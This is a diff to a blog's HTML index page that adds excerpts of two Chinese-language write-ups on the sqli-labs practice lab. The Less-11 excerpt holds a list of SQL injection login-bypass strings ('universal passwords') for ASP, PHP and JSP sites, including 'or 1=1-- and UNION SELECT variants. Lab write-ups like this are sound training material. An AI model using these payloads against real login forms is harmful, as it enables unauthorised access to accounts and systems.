@@ -283,6 +283,292 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/26/sqli-labs-Less-17-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/26/sqli-labs-Less-17-22/" itemprop="url">sqli-labs-Less-17-22</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-26T11:17:26+08:00">
+                2018-04-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="Less-17-POST-Updata-Query-Error-Based-String"><a href="#Less-17-POST-Updata-Query-Error-Based-String" class="headerlink" title="Less-17 POST-Updata Query-Error Based-String"></a>Less-17 POST-Updata Query-Error Based-String</h2><h3 id="基于错误的更新查询post字符注入"><a href="#基于错误的更新查询post字符注入" class="headerlink" title="基于错误的更新查询post字符注入"></a>基于错误的更新查询post字符注入</h3><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>页面显示 PASSWORD RESET 重置密码</p>
+<pre><code>uname=test&amp;passwd=test2返回页面显示重置错误
+uname=admin&amp;passwd=test2返回页面显示重置密码成功
+</code></pre><p>应该是用户名正确即可重置密码</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/26/sqli-labs-Less-17-22/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/sqli-labs-Less-11-16/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/23/sqli-labs-Less-11-16/" itemprop="url">sqli-labs-Less-11-16</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-23T13:43:17+08:00">
+                2018-04-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="Less-11-POST-Error-Based-Single-quotes-String"><a href="#Less-11-POST-Error-Based-Single-quotes-String" class="headerlink" title="Less-11 POST - Error Based - Single quotes - String"></a>Less-11 POST - Error Based - Single quotes - String</h2><h3 id="基于报错的单引号字符注入"><a href="#基于报错的单引号字符注入" class="headerlink" title="基于报错的单引号字符注入"></a>基于报错的单引号字符注入</h3><p>如何绕过身份验证登入进去？<strong>万能密码登入</strong><br>常用万能密码</p>
+<pre><code>asp、aspx
+1:   &quot;or &quot;a&quot;=&quot;a
+2： &apos;)or(&apos;a&apos;=&apos;a
+3：or 1=1--
+4：&apos;or 1=1--
+5：a&apos;or&apos; 1=1--
+6： &quot;or 1=1--
+7：&apos;or&apos;a&apos;=&apos;a
+8： &quot;or&quot;=&quot;a&apos;=&apos;a
+9：&apos;or&apos;&apos;=&apos;
+10：&apos;or&apos;=&apos;or&apos;
+11: 1 or &apos;1&apos;=&apos;1&apos;=1
+12: 1 or &apos;1&apos;=&apos;1&apos; or 1=1
+13: &apos;OR 1=1%00
+14: &quot;or 1=1%00
+15: &apos;xor
+16: 新型万能登陆密码
+用户名 &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; （替换表名admin）
+密码 1
+Username=-1%cf&apos; union select 1,1,1 as password,1,1,1 %23
+ Password=1
+ 17..admin&apos; or &apos;a&apos;=&apos;a 密码随便
+
+PHP万能密码
+&apos;or&apos;=&apos;or&apos; 
+&apos;or 1=1/* 字符型 GPC是否开都可以使用
+User: something
+Pass: &apos; OR &apos;1&apos;=&apos;1
+
+jsp 万能密码 
+1&apos;or&apos;1&apos;=&apos;1
+admin&apos; OR 1=1/*
+用户名：admin 系统存在这个用户的时候 才用得上
+密码：1&apos;or&apos;1&apos;=&apos;1
+</code></pre>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/23/sqli-labs-Less-11-16/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/22/sqli-labs-Less-8-10/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1095,7 +1381,7 @@ Your Password:root@localhost
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
